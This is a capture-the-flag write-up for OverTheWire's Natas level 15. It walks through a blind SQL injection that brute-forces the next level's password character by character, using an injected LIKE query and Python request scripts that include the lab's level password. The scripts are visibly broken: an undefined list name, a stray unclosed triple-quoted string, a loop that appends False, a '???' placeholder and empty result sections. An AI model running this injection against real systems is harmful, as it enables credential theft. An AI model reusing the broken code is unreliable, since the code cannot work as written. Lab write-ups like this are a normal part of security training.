# Natas Level 15 â†’ Level 16

Username: natas15 <br>
URL:      http://natas15.natas.labs.overthewire.org


## SOLUTION

- Once more we see an input form. We can now submit some text to see whether it exists as a user in the table. To check its behaviour, we try "natas16" as a user, since I assume that would be the user for the next level.

- Checking the source code one thing immidiatly stands out: there is a commented "CREATE TABLE" statement at the beggining of the script. I assume there is a table "users" which was creted with this statement and someone lefted it here commented for little reason. I'll assume our username and password both are strings (varchar) with maximum 64 characters in length.

- Reading on, we see a simillar piece of code to the previous exercice. Only this time, instead of granting access after meeting a condition, this script simply tells us if a user exists in the users table.

- Once more, the input is poorly sanitized which allows us to inject SQL code. However, we'll need to be inventive here. Since we already know the username of interest, "natas16", we can try to fetch its password from the users table. But there seems to be no obvious way to print its contents.  
 
- I see 2 potential ways to exploit this. Either we do reconaissanse on the target to see whether we can spawn a shell through our input or we can try to bruteforce our binary response into telling us which characters comprise the password. We'll use the second approach:
  
- The server responds with either a "user exists" (1) or with a user doesn't exist (0). Knowing this, the username and a bit of regex we should be able to bruteforce our way through the password. We can try matching the user **"natas16"** and anything starting with an **"a"**. If indeed our password starts with an **a**, the server should respond with a 1. Otherwise, it responds with 0. We can iterate through all the relevant unicode characters to see which one starts our password. Our test input should be as follows:
```diff
@@                natas16" AND password like "a%"               @@
``` 
- The result is:

-  Alas, our password does not start with **"a"**. Let's try this for other characters. We should try doing this programmatically, since doing it by hand will just take too much time. Let's use a small python script and and design a proof of concept first:

```python

import requests
from bs4 import BeautifulSoup 
import re

#Characters to loop through 
characters = [chr(i) for i in range(32, 126)]

#POST request data
user='natas15'
password='TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url="http://natas15.natas.labs.overthewire.org/"

```
- We'll use BeautifulSoup as it is a good html parser and will allow us to ???. We prepare a list containiing all the unicode characters we'll want to loop through as well as the data needed for our post requests

```python

#Looping through each of the unicode characters 
for i in charList:
    if(i in ['"',"'",'#','%', '_']):
        i='\\'+i
    data={"username":"natas16\" AND BINARY password like \"%s\" #" %(i+'%')}
    myPost = requests.post(url,
                       auth=requests.auth.HTTPBasicAuth(user, password),
                       data=data)

    soup = BeautifulSoup(myPost.content, 'html5lib')
    a=soup.find('div', attrs={'id':'content'})
    b=re.split(r'<br|\n', str(a))[1]
    print("Trying character: %s" %i)
    #len=24
    if(len(b) !=24):
        print("\n We have found the letter!! fThe next letter -----> " + i)     
        break 
```

- We then try to get bruteforce the first letter of the password. We cannot forget to escape important characters such as **%**, which when used with the LIKE operator will match any character 0, 1 or multiple times. This will not help us to match the letter we want, so we escape all the annoying letters that might ruin our regex. Since we always get only 2 types of answer to our post, we can measure the length of "This user doesn't exist." and use it to end out for loop abruptly and print out the letter. The results:

- All that is left is to apply this logic to the whole password. We'll get this for loop into a function and use the length ou the rejection message as a condition to return the letter. We should be able to build the password from here.
 
```python
import requests
from bs4 import BeautifulSoup 
import re

#Characters to loop through 
charList = [chr(i) for i in range(32, 126)]

#POST request data
user='natas15'
password='TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url="http://natas15.natas.labs.overthewire.org/"


"""

def getALetter(string, characters):
    for i in characters:
        if(i in ['"',"'",'#','%', '_']):
            i='\\'+i
        data={"username":"natas16\" AND BINARY password like \"%s\" #" %(string+i+'%')}
        myPost = requests.post(url,
                           auth=requests.auth.HTTPBasicAuth(user, password),
                           data=data)
        soup = BeautifulSoup(myPost.content, 'html5lib')
        a=soup.find('div', attrs={'id':'content'})
        b=re.split(r'<br|\n', str(a))[1]
        
        #len=24 is the length of "This user doens't exist.", the rejection message from the server 
        if(len(b) !=24):
            print(b + " -> " + i)
            return i
    return False
    

finalPass=""
while True:
    letter=getALetter(finalPass, charList)
    if letter or len(finalPass)<64:
        finalPass+=letter
    else:
        print("\nPassword -----> " + finalPass)     
        break
```

- The results:
